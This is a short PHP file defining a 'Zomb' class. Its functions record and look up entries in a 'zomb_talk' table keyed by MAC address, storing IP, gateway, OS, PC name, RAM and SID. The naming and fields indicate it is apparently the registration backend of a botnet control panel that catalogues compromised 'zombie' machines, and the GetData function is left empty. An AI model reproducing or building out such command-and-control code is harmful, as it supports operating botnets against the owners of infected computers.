<?php
	class Zomb {
		function Register ($a, $b, $c, $d, $e, $f, $g, $h, $i, $j) {
			$link = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS);
			mysql_select_db(MYSQL_DB, $link);
			$sql = "INSERT INTO `".MYSQL_DB."`.`zomb_talk` (`ip`, `lang`, `localgateway`, `os`, `macadr`, `archetype`, `pcname`, `ram`, `sid`, `status`) VALUES ('".mysql_real_escape_string($a)."', '".mysql_real_escape_string($b)."', '".mysql_real_escape_string($c)."', '".mysql_real_escape_string($d)."', '".mysql_real_escape_string($e)."', '".mysql_real_escape_string($f)."', '".mysql_real_escape_string($g)."', '".mysql_real_escape_string($h)."', '".mysql_real_escape_string($i)."', '".mysql_real_escape_string($j)."')";
			$query = mysql_query($sql);
			mysql_close($link);
		}
		function Exists ($entry) {
			$link = mysql_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS);
			mysql_select_db(MYSQL_DB, $link);
			$sql = "SELECT * FROM zomb_talk WHERE macadr = '".(mysql_real_escape_string($entry))."'";
			$query = mysql_query($sql);
			if ( mysql_num_rows($query) === 1 ) {
				mysql_close($link);
				Return True;
			} else {
				mysql_close($link);
				Return False;
			}
		}
		function GetData ($macadr) {
			
		}
	}
?>